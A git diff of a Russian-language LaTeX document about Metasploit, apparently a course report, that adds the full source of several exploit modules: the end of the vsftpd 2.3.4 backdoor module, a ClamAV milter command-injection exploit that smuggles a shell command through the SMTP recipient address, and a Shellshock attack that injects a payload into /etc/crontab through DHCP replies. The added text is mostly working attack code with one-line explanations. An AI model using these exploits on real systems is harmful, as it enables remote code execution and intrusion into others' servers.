@@ -298,7 +298,7 @@ Armitage - графический интерфейс для Metasploit.
  
 Для получения доступа к shell эксплоит пытается залогиниться, используя имя пользователя со смайликом. Если сервер уязвим, на порту 6200 открывается доступ к консоли.
 
-\begin{lstlisting}[language=ruby]
+\begin{lstlisting}[caption=modules/exploits/unix/ftp/vsftpd\_234\_backdoor.rb]
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -412,6 +412,201 @@ class Metasploit3 < Msf::Exploit::Remote
 
     s.put("nohup " + payload.encoded + " >/dev/null 2>&1")
     handler(s)
+  end
+
+end
+\end{lstlisting}
+
+Эксплоит к антивирусу ClamAV, используемому совместно с почтовым сервером sendmail. Из-за неправильного использования функции popen() появляется возможность выполнить команду в консоли на сервере.
+
+\begin{lstlisting}[caption=modules/exploits/unix/smtp/clamav\_milter\_blackhole.rb]
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::Smtp
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'ClamAV Milter Blackhole-Mode Remote Code Execution',
+      'Description'    => %q{
+          This module exploits a flaw in the Clam AntiVirus suite 'clamav-milter'
+        (Sendmail mail filter). Versions prior to v0.92.2 are vulnerable.
+        When implemented with black hole mode enabled, it is possible to execute
+        commands remotely due to an insecure popen call.
+      },
+      'Author'         => [ 'patrick' ],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          [ 'CVE', '2007-4560' ],
+          [ 'OSVDB', '36909' ],
+          [ 'BID', '25439' ],
+          [ 'EDB', '4761' ]
+        ],
+      'Privileged'     => true,
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+          'Space'       => 1024,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd cmd_bash',
+              'RequiredCmd' => 'generic perl ruby bash-tcp telnet',
+            }
+        },
+      'Platform'       => 'unix',
+      'Arch'           => ARCH_CMD,
+      'Targets'        =>
+        [
+          [ 'Automatic', { }],
+        ],
+      'DisclosureDate' => 'Aug 24 2007',
+      'DefaultTarget'  => 0))
+
+      register_options(
+      [
+        OptString.new('MAILTO', [ true, 'TO address of the e-mail', 'nobody@localhost']),
+      ], self.class)
+  end
+
+  def exploit
+
+    # ClamAV writes randomized msg.###### temporary files in a randomized
+    # /tmp/clamav-#######################/ directory. This directory is
+    # the clamav-milter process working directory.
+    #
+    # We *can* execute arbitrary code directly from 'sploit', however the
+    # SMTP RFC rejects all payloads with the exception of generic CMD
+    # payloads due to the IO redirects. I discovered that the 'From:'
+    # header is written to this temporary file prior to the vulnerable
+    # call, so we call the file itself and payload.encoded is executed.
+
+    sploit = "sh msg*" # Execute the clamav-milter temporary file.
+
+    # Create the malicious RCPT TO before connecting,
+    # to make good use of the Msf::Exploit::Smtp support.
+
+    oldaddr = datastore['MAILTO']
+    newaddr = oldaddr.split('@')
+
+    datastore['MAILTO'] = "<#{newaddr[0]}+\"|#{sploit}\"@#{newaddr[1]}>"
+
+    connect_login
+
+    sock.put("From: ;#{payload.encoded}\r\n") # We are able to stick our payload in this header
+    sock.put(".\r\n")
+
+    # Clean up RCPT TO afterwards
+
+    datastore['MAILTO'] = oldaddr
+
+    handler
+    disconnect
+  end
+
+end
+\end{lstlisting}
+
+Эксплоит для DHCP. Причина - известная уязвимость в Bash под названием Shellshock, позволяющая выполнить код на сервере, когда программа пытается установить переменную окружения.
+
+\begin{lstlisting}[caption=modules/exploits/unix/dhcp/bash\_environment.rb]
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+require 'rex/proto/dhcp'
+
+class Metasploit3 < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::DHCPServer
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Dhclient Bash Environment Variable Injection (Shellshock)',
+      'Description'    => %q|
+        This module exploits the Shellshock vulnerability, a flaw in how the Bash shell
+        handles external environment variables. This module targets dhclient by responding
+        to DHCP requests with a malicious hostname, domainname, and URL which are then
+        passed to the configuration scripts as environment variables, resulting in code
+        execution. Due to length restrictions and the unusual networking scenario at the
+        time of exploitation, this module achieves code execution by writing the payload
+        into /etc/crontab and then cleaning it up after a session is created.
+      |,
+      'Author'         =>
+        [
+          'Stephane Chazelas', # Vulnerability discovery
+          'egypt' # Metasploit module
+        ],
+      'License'        => MSF_LICENSE,
+      'Platform'       => ['unix'],
+      'Arch'           => ARCH_CMD,
+      'References'     =>
+        [
+          ['CVE', '2014-6271'],
+          ['CWE', '94'],
+          ['OSVDB', '112004'],
+          ['EDB', '34765'],
+          ['URL', 'https://securityblog.redhat.com/2014/09/24/bash-specially-crafted-environment-variables-code-injection-attack/'],
+          ['URL', 'http://seclists.org/oss-sec/2014/q3/649'],
+          ['URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/']
+        ],
+      'Payload'        =>
+        {
+          # 255 for a domain name, minus some room for encoding
+          'Space'       => 200,
+          'DisableNops' => true,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic telnet ruby',
+            }
+        },
+      'Targets'        => [ [ 'Automatic Target', { }] ],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => 'Sep 24 2014'
+    ))
+
+    deregister_options('DOMAINNAME', 'HOSTNAME', 'URL')
+  end
+
+  def on_new_session(session)
+    print_status "Cleaning up crontab"
+    # XXX this will brick a server some day
+    session.shell_command_token("sed -i '/^\\* \\* \\* \\* \\* root/d' /etc/crontab")
+  end
+
+  def exploit
+    hash = datastore.copy
+    # Quotes seem to be completely stripped, so other characters have to be
+    # escaped
+    p = payload.encoded.gsub(/([<>()|'&;$])/) { |s| Rex::Text.to_hex(s) }
+    echo = "echo -e #{(Rex::Text.to_hex("*") + " ") * 5}root #{p}>>/etc/crontab"
+    hash['DOMAINNAME'] = "() { :; };#{echo}"
+    if hash['DOMAINNAME'].length > 255
+      raise ArgumentError, 'payload too long'
+    end
+
+    hash['HOSTNAME'] = "() { :; };#{echo}"
+    hash['URL'] = "() { :; };#{echo}"
+    start_service(hash)
+
+    begin
+      while @dhcp.thread.alive?
+        sleep 2
+      end
+    ensure
+      stop_service
+    end
   end
 
 end
